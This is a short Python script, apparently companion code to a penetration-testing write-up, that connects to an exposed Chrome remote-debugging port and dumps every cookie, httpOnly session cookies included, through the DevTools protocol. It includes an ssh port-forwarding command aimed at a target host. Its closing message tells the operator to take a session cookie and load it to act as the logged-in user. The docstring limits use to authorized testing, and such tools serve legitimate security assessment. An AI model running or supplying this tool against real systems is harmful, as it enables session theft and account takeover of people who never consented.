#!/usr/bin/env python3
"""
Dump cookies from a Chrome DevTools remote-debugging endpoint (read-only).

The DevTools Protocol has no auth; this demonstrates why an exposed debug port
is a session store. Run it ONLY against a port you are authorized to access
(your own, a lab, or an engagement with written permission). It reads cookies
via Network.getAllCookies and changes nothing.
Writeup: https://jperezduerto.info/techniques/chrome-remote-debug-session-theft/

    pip install websocket-client
    python3 chrome-cookies.py http://localhost:9222

Forward the port first:  ssh -L 9222:localhost:<PORT> user@target
"""
import json
import sys
import urllib.request

try:
    from websocket import create_connection  # pip install websocket-client
except ImportError:
    sys.exit("need websocket-client:  pip install websocket-client")


def main(base):
    base = base.rstrip("/")
    targets = json.load(urllib.request.urlopen(base + "/json/list", timeout=5))
    if not targets:
        sys.exit("no open targets; the automated browser may be between runs (check the cron interval)")
    print(f"[*] {len(targets)} open target(s):")
    for t in targets:
        print(f"    - {t.get('type')}: {t.get('title','')[:60]}  {t.get('url','')[:70]}")
    ws_url = targets[0]["webSocketDebuggerUrl"]
    ws = create_connection(ws_url, timeout=5)
    ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
    while True:
        msg = json.loads(ws.recv())
        if msg.get("id") == 1:
            cookies = msg.get("result", {}).get("cookies", [])
            break
    ws.close()
    print(f"\n[!] {len(cookies)} cookie(s):")
    for c in cookies:
        flags = ",".join(k for k in ("httpOnly", "secure", "session") if c.get(k))
        print(f"    {c.get('domain','')}{c.get('path','')}  {c.get('name','')}={c.get('value','')}  [{flags}]")
    print("\nTake a session cookie for the app the automation drives, forward that app's port, and load it as that user.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit("usage: chrome-cookies.py http://localhost:9222")
    main(sys.argv[1])
